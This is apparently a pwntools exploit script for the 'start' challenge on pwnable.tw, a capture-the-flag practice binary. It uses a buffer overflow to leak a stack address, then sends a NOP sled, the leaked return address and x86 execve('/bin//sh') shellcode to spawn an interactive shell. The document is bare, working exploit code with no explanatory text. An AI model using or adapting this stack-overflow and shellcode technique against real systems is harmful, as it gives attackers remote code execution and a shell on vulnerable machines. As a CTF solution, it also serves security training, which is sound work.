from pwn import*
#p = remote('chall.pwnable.tw',10000)
p = process('./start')
shellcode = ''
shellcode += '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
pay = ''
pay += 'a'*0x14
pay += p32(0x08048087)
p.sendafter('CTF:',pay)
stack = u32(p.recv(4))
log.info("stack addr : {}".format(hex(stack)))

try:
	pay = ''
	pay += '\x90'*0x14
	pay += p32(stack)
	pay += asm("xor eax, eax")
	pay += asm("xor ebx, ebx")
	pay += asm("xor ecx, ecx")
	pay += asm("xor edx, edx")
	pay += asm("xor edx, edx")
	pay += shellcode
	
	p.send(pay)
	p.recv()

	p.interactive()

except EOFError:
	print("EOFError")
	p.close()

